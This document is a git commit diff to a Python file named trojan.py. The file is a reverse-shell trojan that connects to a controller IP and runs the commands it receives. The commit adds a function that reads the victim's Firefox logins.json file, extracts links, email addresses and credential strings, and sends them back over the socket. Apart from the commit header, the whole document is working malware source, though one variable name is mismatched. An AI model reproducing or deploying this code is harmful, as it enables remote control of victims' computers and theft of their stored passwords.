9626daf6ebdc3da79b7a637e84c716c9d0beb281
Jhouuxtin12 <32176772+Jhouuxtin12@users.noreply.github.com>
2018-01-28 09:42:59 +0000

    Add files via upload

--- trojan.py
+++ trojan.py
@@ -1,6 +1,8 @@
 import socket
 import subprocess
 import time
+import re
+from os import chdir
 
 
 ip = "192.168.0.105"
@@ -8,6 +10,26 @@ port = 4002
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def senhas(s):
+	try:
+		getuserprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
+		usr = userprof[1].strip('\r\n')
+		f = open('C:\\Users\\'+usr+'\\AppData\\Roaming\\Mozilla\\Firefox\Profiles\\a25ik1y6.default\\logins.json')
+		text = f.read()
+		links = re.findall(r'(https?:\/\/[^"\'>]*)', text)
+		emails = re.findall(r'[\w\._-]+@[\w\_-]+\.[\w\._-]+\w', text)
+		passwords = re.findall(r'[A-Z][\w.]+[\w.]+[\w.]+===?', text)
+		for link in links:
+			s.send("[==>] Link %s" %(link))
+		s.send('\n')
+		for password in passwords:
+			s.send("[==>] Pass: %s" %(password))
+		s.send('\n')
+		for email in emails:
+			s.send("[==>] Emails: %s" %(email))
+	except:
+		s.send("Falha ao pegar senhas")
 
 def conectar(ip, port):
 	try:
@@ -24,7 +46,10 @@ def shell(s):
 			proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 			saida = proc.stdout.read() + proc.stderr.read()
 			s.send("%s\n" %(saida))
+			s.send("Pegando Senhas...")
+			senhas(s)
 			s.send("CMD: ")
+			
 		except:
 			main(s)
 
